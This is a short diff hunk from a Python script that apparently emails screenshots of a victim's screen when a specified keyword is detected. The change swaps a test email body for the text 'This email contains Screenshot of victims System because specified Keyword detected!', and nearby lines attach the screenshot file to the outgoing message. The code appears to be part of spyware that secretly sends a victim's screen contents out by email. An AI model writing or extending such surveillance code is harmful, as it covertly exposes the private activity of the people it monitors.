@@ -55,7 +55,7 @@ if count > 0:
     msg['To'] = reciever_email
     msg['Subject'] = subject
 
-    email_body = 'This is a test email sent by python. Isnt that cool?'
+    email_body = 'This email contains Screenshot of victims System because specified Keyword detected!'
     msg.attach(MIMEText(email_body, 'plain'))
 
     filename = 'SS-'+a+'.png'         #storing the file to be sent
